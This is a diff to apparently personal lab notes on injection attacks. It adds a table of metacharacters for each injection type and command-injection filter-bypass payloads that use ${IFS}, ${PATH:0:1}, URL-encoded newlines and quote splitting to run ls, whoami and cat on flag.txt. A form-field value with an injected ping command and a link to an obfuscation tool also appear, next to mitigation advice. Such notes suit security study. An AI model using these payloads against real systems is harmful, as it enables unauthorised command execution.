@@ -1,3 +1,28 @@
+SQL Injection	' , ; -- /* */
+Command Injection	; &&
+LDAP Injection	* ( ) & |
+XPath Injection	' or and not substring concat count
+OS Command Injection	; & |
+Code Injection	' ; -- /* */ $() ${} #{} %{} ^
+Directory Traversal/File Path Traversal	../ ..\\ %00
+Object Injection	; & |
+XQuery Injection	' ; -- /* */
+Shellcode Injection	\x \u %u %n
+Header Injection	\n \r\n \t %0d %0a %09
+
+
+%0a{ls,-la}
+${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
+https://forum.hackthebox.com/t/bypassing-other-blacklisted-characters/255983/3
+
+${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r
+127.0.0.1${LS_COLORS:10:1}%0ac"at"${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+
+%3bw'h'oami = ;whoami
+;cat /flag.txt = %3bc'a't${IFS}${PATH:0:1}flag.txt
+
+https://github.com/Bashfuscator/Bashfuscator
+
 csrf=GK6RtPkm4YC2K9ZWsZiF3iuwEbBRjtL6&name=tushar&email=tushar%40gmail.com ||ping -c 20 127.0.0.1 ||&subject=hindi&message=math
 
 OS command injection, simple case
@@ -94,4 +119,5 @@ Avoid calling shell commands with user input.
 Use language-native APIs instead of shell calls.
 Sanitize and validate all input.
 Use parameterized calls (where applicable).
+
 Run apps with the least privilege.
